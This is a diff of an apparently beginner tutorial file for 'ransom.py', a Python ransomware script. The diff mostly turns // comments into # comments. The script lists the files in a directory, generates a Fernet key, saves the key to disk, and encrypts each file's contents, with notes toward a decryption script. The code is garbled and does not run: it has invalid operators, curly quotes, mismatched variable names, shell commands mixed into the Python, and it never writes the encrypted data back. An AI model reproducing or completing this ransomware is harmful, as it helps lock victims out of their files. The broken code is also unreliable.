@@ -1,13 +1,17 @@
-//Fernet - is a symmetric encryption method that guarantees that a message encrypted using it cannot be manipulated or read without the key. It uses URL safe codes encoding for the keys. Fernet also uses 128-bit AES.
-//To test, create a ssh to a root host server
-//Create some test files to test the ransomware. 
-//Create the ransomware file
+#Fernet - is a symmetric encryption method that guarantees that a message encrypted using it cannot be manipulated or read without the key. It uses URL safe codes encoding for the keys. Fernet also uses 128-bit AES.
+#To test, create a ssh to a root host server
+#Create some test files to test the ransomware. 
+#Create the ransomware file
 
-nano ransom.py     //name of file 
-//#!/user/bin/env python 3     //file pathway bash script
+#!/user/bin/env python 3     
+#file pathway bash script
+
+#nano ransom.py     
+#name of file
 import os  
 from cryptography.fernet import Fernet 
-files = []                              // Find all files in the directory to encrypt them and add them to a list.
+#Find all files in the directory to encrypt them and add them to a list.
+files = []                              
 for file in os.listdir():   
     if file = = “ransom.py” or file == “theK.key” or file == “decrypt.py” :
          continue
@@ -16,15 +20,17 @@ for file in os.listdir():
 print(files)
 key = Fernet.generate_key()
 
-with open (“thekey.key”, “wb”) as thekey:      //wb = write binary (why binary!!)
+#wb = write binary
+#rb= read binary
+with open (“thekey.key”, “wb”) as thekey:      
       theK.write(key)
 for file in files:
       with open(file, “rb”) as thefile:
           contents= thefile.read()
       contents_encrypted = Fernet(key).encrypt(contents)
       
-//Ransomware decryption script 
-// copy the ransomware folder and send it to another folder
+#Ransomware decryption script 
+#copy the ransomware folder and send it to another folder
 
 cp ransomware.py decrpty.py 
 nano decrypt 
